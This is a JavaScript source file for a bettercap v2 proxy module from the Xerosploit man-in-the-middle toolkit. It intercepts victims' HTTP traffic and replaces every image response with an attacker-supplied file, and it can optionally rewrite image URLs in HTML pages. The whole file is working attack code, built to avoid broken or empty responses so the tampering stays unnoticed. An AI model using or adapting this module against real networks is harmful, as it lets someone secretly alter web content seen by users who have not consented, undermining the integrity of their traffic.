// ---------------------------------------------------------------------------
// Xerosploit-NG :: bettercap v2 HTTP proxy module -- ReplaceImages
//
// Replaces images with the file referenced by the generated global
// XE_IMAGE_FILE.  Backs the "Image Replace" menu entry of Xerosploit
// ("Replace all web pages images with your own one").
//
// Ported from the bettercap v1 Ruby proxy module:
//   modules/replace_images.rb   (GPLv3)
// v1 rewrote <img> URLs inside text/html to point at its own HTTPD
// (`--httpd`); because bettercap v2 needs no bundled HTTPD, this port supports
// two complementary strategies:
//
//   1. Image responses (Content-Type image/*): the body is swapped for
//      XE_IMAGE_FILE, with the Content-Type derived from the replacement file
//      (magic-byte sniff first, then filename extension, else
//      application/octet-stream).  This is the primary, self-contained mode.
//
//   2. HTML image URLs: if XE_IMAGE_URL is provided, every quoted image URL in
//      text/html is rewritten to it (the faithful v1 behaviour when a served
//      replacement image is available).
//
// Generated parameter globals (lib/engine.py, PORT-SPEC section 6):
//   XE_IMAGE_FILE  absolute path of the replacement image (primary)
//   XE_IMAGE_URL   optional URL of a served replacement image (HTML rewrite)
//
// FAIL-OPEN BODY DISCIPLINE (bettercap v2): res.ReadBody() flips bettercap's
// "body modified" flag, so after the body has been read this module MUST write
// a body back or bettercap emits an EMPTY response.  The decision to rewrite
// is therefore made from method/status/headers/content-type alone; only then
// is the body read exactly once.  Every exit path after that read sets the
// body and a Content-Length equal to the UTF-8 byte length of the string it
// writes: either the mutated bytes, or the byte-exact original on failure.
// GET + status 200 + no Range/Content-Range only; RANGE/206 responses are never
// touched.  A response this module does not handle is left byte-identical.
//
// Released under the GNU GPLv3.
// Original Xerosploit: LionSec / Neodrix.
// bettercap proxy-module concepts: Simone 'evilsocket' Margaritelli (GPLv3).
// ---------------------------------------------------------------------------

var XE_MODULE_NAME = "replace_images";

function xeLog(msg) {
    if (typeof log_info === "function") { log_info("[xerosploit:" + XE_MODULE_NAME + "] " + msg); }
}
function xeWarn(msg) {
    if (typeof log_warn === "function") { log_warn("[xerosploit:" + XE_MODULE_NAME + "] " + msg); }
}

function xeByteLen(s) {
    var n = 0, i, c;
    s = "" + s;
    for (i = 0; i < s.length; i++) {
        c = s.charCodeAt(i);
        if (c < 0x80) { n += 1; }
        else if (c < 0x800) { n += 2; }
        else if (c >= 0xD800 && c <= 0xDBFF) { n += 4; i += 1; }
        else { n += 3; }
    }
    return n;
}

// Case-insensitive read from a bettercap header map (req.Headers / res.Headers).
function xeGetHeader(headers, name) {
    if (!headers) { return null; }
    var want = ("" + name).toLowerCase();
    var key;
    for (key in headers) {
        if (("" + key).toLowerCase() === want) {
            var value = headers[key];
            if (value === null || value === undefined) { return null; }
            return value;
        }
    }
    return null;
}

// Decide, from method/status/headers ALONE (no body read), whether this
// response may be rewritten as a full-body 200.
function xeSkipResponse(req, res) {
    if (!req || req.Method !== "GET") { return true; }
    if (!res || res.Status !== 200) { return true; }
    if (xeGetHeader(req.Headers, "Range")) { return true; }
    if (xeGetHeader(res.Headers, "Content-Range")) { return true; }
    return false;
}

var XE_STALE_HEADERS = [
    "Content-Range", "Accept-Ranges", "ETag", "Last-Modified", "Digest",
    "Content-MD5", "Content-Disposition", "Content-Encoding", "Transfer-Encoding"
];

function xeWriteBody(res, body) {
    res.Body = body;
    if (typeof res.SetHeader === "function") {
        res.SetHeader("Content-Length", "" + xeByteLen(body));
    }
}

function xeReplaceBody(res, body, contentType) {
    if (typeof res.RemoveHeader === "function") {
        for (var i = 0; i < XE_STALE_HEADERS.length; i++) {
            res.RemoveHeader(XE_STALE_HEADERS[i]);
        }
    }
    if (contentType && typeof res.SetHeader === "function") {
        res.SetHeader("Content-Type", contentType);
    }
    xeWriteBody(res, body);
}

function xeReadFile(path) {
    if (!path || typeof readFile !== "function") { return null; }
    try { return readFile(path); } catch (e) { xeWarn("cannot read " + path + ": " + e); return null; }
}

function xeReadBody(res) {
    if (!res) { return null; }
    if (typeof res.ReadBody === "function") { return res.ReadBody(); }
    return res.Body;
}

// Lowercase extension of a path/filename, query and fragment stripped.
function xeFileExtension(path) {
    if (!path) { return ""; }
    var p = ("" + path).toLowerCase();
    var q = p.indexOf("?");
    if (q !== -1) { p = p.substring(0, q); }
    var h = p.indexOf("#");
    if (h !== -1) { p = p.substring(0, h); }
    var slash = p.lastIndexOf("/");
    if (slash !== -1) { p = p.substring(slash + 1); }
    var dot = p.lastIndexOf(".");
    if (dot === -1 || dot === p.length - 1) { return ""; }
    return p.substring(dot + 1);
}

// MIME type inferred from the replacement file's magic bytes, or null.
function xeSniffImageMime(data) {
    if (typeof data !== "string" || data.length < 4) { return null; }
    var b0 = data.charCodeAt(0) & 0xFF, b1 = data.charCodeAt(1) & 0xFF,
        b2 = data.charCodeAt(2) & 0xFF, b3 = data.charCodeAt(3) & 0xFF;
    if (b0 === 0x89 && b1 === 0x50 && b2 === 0x4E && b3 === 0x47) { return "image/png"; }
    if (b0 === 0xFF && b1 === 0xD8 && b2 === 0xFF) { return "image/jpeg"; }
    if (b0 === 0x47 && b1 === 0x49 && b2 === 0x46 && b3 === 0x38) { return "image/gif"; }
    if (data.length >= 12 &&
        data.charCodeAt(0) === 0x52 && data.charCodeAt(1) === 0x49 &&
        data.charCodeAt(2) === 0x46 && data.charCodeAt(3) === 0x46 &&
        data.charCodeAt(8) === 0x57 && data.charCodeAt(9) === 0x45 &&
        data.charCodeAt(10) === 0x42 && data.charCodeAt(11) === 0x50) {
        return "image/webp";
    }
    return null;
}

// Content type for the replacement image: magic bytes win, then the filename
// extension, then application/octet-stream.  Never hard-coded to .png.
function xeImageMime(path, data) {
    var sniffed = xeSniffImageMime(data);
    if (sniffed) { return sniffed; }
    var ext = xeFileExtension(path);
    if (ext === "png") { return "image/png"; }
    if (ext === "jpg" || ext === "jpeg") { return "image/jpeg"; }
    if (ext === "gif") { return "image/gif"; }
    if (ext === "webp") { return "image/webp"; }
    if (ext === "bmp") { return "image/bmp"; }
    if (ext === "svg") { return "image/svg+xml"; }
    if (ext === "ico") { return "image/x-icon"; }
    return "application/octet-stream";
}

// Quoted image URLs inside HTML, mirroring v1's regex on (png|jpg|...|svg).
var XE_IMG_RE = /(["'])[^"'\s>]+\.(png|jpe?g|gif|bmp|webp|svg|ico)(\?[^"'\s>]*)?\1/gi;

function onLoad() {
    var f = (typeof XE_IMAGE_FILE === "undefined") ? null : XE_IMAGE_FILE;
    var u = (typeof XE_IMAGE_URL === "undefined") ? null : XE_IMAGE_URL;
    xeLog("loaded (image_file=" + f + ", image_url=" + u + ")");
}

function onResponse(req, res) {
    if (!res || typeof res.ContentType !== "string") { return; }

    // Decide from headers/URL only; a skipped response is never read or mutated.
    if (xeSkipResponse(req, res)) { return; }

    var ct = res.ContentType.toLowerCase();
    var path = (req && req.Path) ? req.Path : "";

    // --- HTML: rewrite image URLs when a served URL was provided (v1 path) ---
    if (ct.indexOf("text/html") === 0) {
        var imgUrl = (typeof XE_IMAGE_URL === "undefined") ? null : XE_IMAGE_URL;
        if (!imgUrl) { return; }                                         // passthrough, never read

        var html = null;
        try {
            html = xeReadBody(res);
            if (typeof html !== "string") { return; }
            var rewritten = html.replace(XE_IMG_RE, function (m, quote) { return quote + imgUrl + quote; });
            if (rewritten !== html) {
                xeLog("rewriting image URLs in " + path + " to " + imgUrl);
                xeReplaceBody(res, rewritten, res.ContentType);
            } else {
                xeWriteBody(res, html);
            }
        } catch (e) {
            xeWarn("onResponse failed: " + e);
            if (typeof html === "string") {
                xeWriteBody(res, html);                                  // fail-open: exact original bytes
            }
        }
        return;
    }

    // --- Image response: swap the bytes for XE_IMAGE_FILE (primary mode) ---
    if (ct.indexOf("image/") === 0) {
        var imgFile = (typeof XE_IMAGE_FILE === "undefined") ? null : XE_IMAGE_FILE;
        if (!imgFile) { xeWarn("XE_IMAGE_FILE is not set; passing through"); return; }

        var payload = xeReadFile(imgFile);
        if (payload === null || payload === "") { xeWarn("empty image file: " + imgFile); return; }

        var original = null;
        try {
            original = xeReadBody(res);
            if (typeof original !== "string") { return; }

            xeLog("replacing image " + path + " with " + imgFile);
            xeReplaceBody(res, payload, xeImageMime(imgFile, payload));
        } catch (e) {
            xeWarn("onResponse failed: " + e);
            if (typeof original === "string") {
                xeWriteBody(res, original);                              // fail-open: exact original bytes
            }
        }
        return;
    }
}
